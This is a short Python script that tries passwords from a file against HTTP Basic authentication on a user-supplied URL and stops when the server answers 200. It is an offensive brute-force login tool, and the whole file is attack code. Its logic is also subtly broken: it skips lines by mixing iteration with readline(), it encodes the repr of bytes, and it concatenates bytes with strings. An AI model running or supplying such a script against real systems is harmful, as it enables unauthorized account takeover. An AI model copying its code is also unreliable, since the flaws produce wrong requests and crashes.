import requests, base64

#file = input('enter file name').encode()
url = input('enter url') #http://192.168.1.59:80
lst = []

try:
    with open('passwd.txt', 'rb') as f:
        for i in f:
            a=f.readline().strip()
            lst.append(a)
            b64Val = base64.b64encode(str(a).encode())
            b64Val = base64.b64encode(str(a).encode())
            print(b64Val)
            r=requests.post(url, headers={"Authorization": "Basic %s" % b64Val}, data='')
            #print('\n')
            status = str(r.status_code)
            #print(status)
            if status == '200':
                print("brut force sucessfull and password is--")
                #print(u+'   '+p+'   '+b64Val.decode()+'    SUCESS')
                print(i)
                break
            else:
                print(a+'   '+b64Val.decode()+'    Faild')
    
except Exception as a:
    print(a)
